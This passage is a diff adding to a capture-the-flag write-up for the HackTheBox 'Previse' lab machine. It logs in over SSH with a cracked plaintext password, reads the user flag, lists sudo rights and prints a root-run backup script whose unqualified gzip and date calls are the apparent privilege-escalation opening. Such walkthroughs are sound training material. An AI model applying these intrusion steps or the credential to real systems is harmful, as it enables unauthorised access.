@@ -329,4 +329,43 @@
 
     m4lwhere : ilovecody112235!
     
-// 
+// We can try to SSH to the machine now
+
+// And we got user flag !!!
+
+    $ ssh m4lwhere@10.10.11.104
+-------
+
+    m4lwhere@10.10.11.104's password: 
+    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)
+
+    m4lwhere@previse:~$ ls
+    user.txt
+    m4lwhere@previse:~$ cat user.txt 
+    fdd1e6...............
+
+
+### -------Privilleges Escalation--------
+
+// Lets run 'sudo -l' to check wich sudo privilleges we have
+
+    m4lwhere@previse:~$ sudo -l
+    [sudo] password for m4lwhere: 
+    User m4lwhere may run the following commands on previse:
+        (root) /opt/scripts/access_backup.sh
+        
+// Its seems we can run 'access_backup.sh' with sudo privilleges
+
+// lets check this file
+
+    m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
+    #!/bin/bash
+
+    # We always make sure to store logs, we take security SERIOUSLY here
+
+    # I know I shouldnt run this as root but I cant figure it out programmatically on my account
+    # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+    gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+    gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
+
